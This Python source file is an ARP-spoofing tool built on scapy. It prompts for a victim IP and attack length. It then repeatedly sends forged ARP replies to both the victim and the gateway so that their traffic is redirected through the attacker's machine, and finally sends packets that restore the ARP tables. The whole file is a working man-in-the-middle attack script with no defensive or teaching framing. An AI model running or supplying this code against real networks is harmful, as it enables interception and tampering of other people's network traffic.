import time
from scapy.all import Ether, ARP, srp, send
from threading import Thread as new_thread

class _ARP:
    def __init__(self, target_ip, gateway_ip = "192.168.0.1", attack_length=9e9):

        def break_on_timer():
            time.sleep(attack_length)
            self.running = False

        self.running = True
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.attack_length = attack_length

        new_thread(target=break_on_timer).start()

    def get_mac_address(self, ip):
        res, _ = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=4)
        if res:
            return res[0][1].src

    def send_spoof_packet(self, target_ip, host_ip, show_response=True):
        target_mac_address = self.get_mac_address(target_ip)
        #gateway_mac_address = self.get_mac_address(host_ip)

        arp_packet = ARP(
            pdst = target_ip,
            hwdst = target_mac_address,
            psrc = host_ip,
            op = "is-at"
        )

        send(arp_packet, count = 7, verbose = 0)

        if show_response:
            print(f"Sent ARP packet: {self.target_ip}, {self.gateway_ip}")

    def quit_spoof(self, show_response = True):
        target_mac_address = self.get_mac_address(self.target_ip)
        gateway_mac_address = self.get_mac_address(self.gateway_ip)

        arp_packet = ARP(
            pdst = self.target_ip,
            hwdst = target_mac_address,
            psrc = self.gateway_ip,
            hwsrc = gateway_mac_address
        )

        send(arp_packet, count = 7, verbose = 0)

        if show_response:
            print(f"Sent ARP packet: {self.target_ip}, {self.gateway_ip}")

    def start(self):
        try:
            while self.running:
                self.send_spoof_packet(self.target_ip, self.gateway_ip, 0)
                self.send_spoof_packet(self.gateway_ip, self.target_ip, 0)
                time.sleep(1)

            raise KeyboardInterrupt()

        except KeyboardInterrupt:
            self.quit_spoof()
            self.quit_spoof()


if __name__ == "__main__":
    arp_model = _ARP(input("Victim IP: ").strip(), attack_length=int(input("Attack length: ").strip()))
    arp_model.start()
